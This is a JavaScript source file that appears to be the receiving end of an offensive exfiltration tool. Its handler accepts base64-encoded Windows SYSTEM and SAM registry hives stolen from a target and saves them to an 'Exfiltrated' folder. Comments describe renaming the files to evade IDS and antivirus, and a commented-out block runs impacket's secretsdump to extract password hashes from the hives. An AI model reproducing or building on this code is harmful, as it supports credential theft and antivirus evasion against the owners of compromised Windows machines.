const fs = require("fs");
const path = require("path");
const { getTimestamp, getFileExtension, textExtensions } = require("../util.js");
const { exec } = require('child_process');
const logging = require("../logging.js");

/**
 * The POST function for regexport
 * This takes in the request JSON and "downloads the file" in ../Exfiltrated/
 */
module.exports = function(request) 
{
    logging.log("Executing regexport POST function");

    // Let's first declare the directory path we want to write to. If it does not exist, create said path.
    // @see ./ls_read.js for more
    const dir_path = path.join(`./Exfiltrated`, `${getTimestamp()} regexport/`).replace(/\:/gmi, "-");
    fs.mkdirSync(dir_path, {
        recursive: true
    });

    /**
     * @type {JSON}
     */
    let reqJSON = JSON.parse(request.body);
    
    // Loop through the SYSTEM and SAM files. Then, it writes the file inside $dir_path.
    // We're not hardcoding SYSTEM and SAM because there's a good chance we'll have to rename the SYSTEM and SAM names due to IDS or antivirus stuff
    Object.entries(reqJSON).forEach((jsonEntry) => {
        const [fileName, fileBase64] = jsonEntry;
        let filePath = path.resolve(dir_path, fileName);
        
        // Classify the documents we get into text ones or binary ones. 
        // SYSTEM and SAM files should be binary

        var fileExtension = getFileExtension(fileName).toLowerCase();
        if (textExtensions.indexOf(fileExtension) != -1)
        {
            // There's no reason why our SYSTEM/SAM files should be in UTF-8/ASCII
            logging.error(`Not copying ${fileName} into ${filePath} for regexport because it's not a binary file.`);
            return;
        }
        else
        {
            let fileContent = Buffer.from(fileBase64, 'base64');
            fs.writeFileSync(filePath, fileContent, {encoding: "binary"});

            // 🚨 If you have the impackets python library installed on your system, you can uncomment this and try to extract the hashes right here, right now
            // However, 👮 I would not reccomending doing that. Please don't install impackets on your PC. For security reasons, just exfiltrate the SYSTEM/SAM files like normal
            // and then if you want to extract hashes from them, boot up a Kali VM or something
            // The last thing you want is for an attacker with access to your PC to go "oooh they have impackets installed? Awesome :)"

            // let secretsdumpPath = "./secretsdump.py";                // Fill this in the following variables with absolute or relative paths
            // let samFilePath = "./Sam";
            // let systemFilePath = "./System";
            // let outputFilePath = "./pwd_hashes";

            // logging.log(`regexports: Running impackets secretsdump.py on SYSTEM and SAM file.`);
            // exec(`python ${secretsdumpPath} LOCAL -system ${systemFilePath} -sam ${samFilePath} -outputfile ${outputFilePath}`, (err, stdout, stderr) => {
            //     if (err)
            //     {
            //         logging.error(`Error while attempting to launch impackets secretsdump: ${err}`);
            //     }

            //     logging.log(`Output from impackets secretsdump: ${stdout}`);
            //     logging.error(`Error while executing impackets secretsdump: ${stderr}`);
            // });
        }

        logging.log(`Copied file ${fileName} into ${filePath}.`);
    });
}